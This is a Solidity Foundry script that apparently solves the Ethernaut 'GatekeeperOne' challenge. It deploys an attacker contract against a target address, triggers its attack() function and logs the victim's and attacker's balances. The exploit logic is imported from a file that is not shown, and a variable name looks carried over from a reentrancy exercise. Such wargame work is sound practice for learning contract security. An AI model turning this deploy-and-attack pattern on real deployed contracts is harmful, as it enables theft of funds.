// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {GatekeeperOneAttack, IGatekeeperOne} from "../src/GatekeeperOneAttack.sol";

contract Deploy is Script {
    function run() external {
        address target = vm.envAddress("GATEKEPEER1_ADDRESS");

        vm.startBroadcast();
        GatekeeperOneAttack attacker = new GatekeeperOneAttack(target);
        vm.stopBroadcast();
        
        console2.log("Attacker depoyed at: ", address(attacker));
        console2.log("Victim balance: ", address(target).balance);
        console2.log("Attacker balacnce: ", address(attacker).balance);
        console2.log("Put GATEKEPEER1_ATTACKER_ADDRESS in .env: ");
    }
}

contract Attack is Script {
    function run() external {
        address attackerAddress = vm.envAddress("GATEKEPEER1_ATTACKER_ADDRESS");
        address target = vm.envAddress("GATEKEPEER1_ADDRESS");
        IGatekeeperOne reentrance = IGatekeeperOne(target);
        GatekeeperOneAttack attacker = GatekeeperOneAttack(payable(attackerAddress));

        vm.startBroadcast();
        attacker.attack();
        vm.stopBroadcast();

        console2.log("attack finished, the victim balance is: ", address(reentrance).balance);
    }
}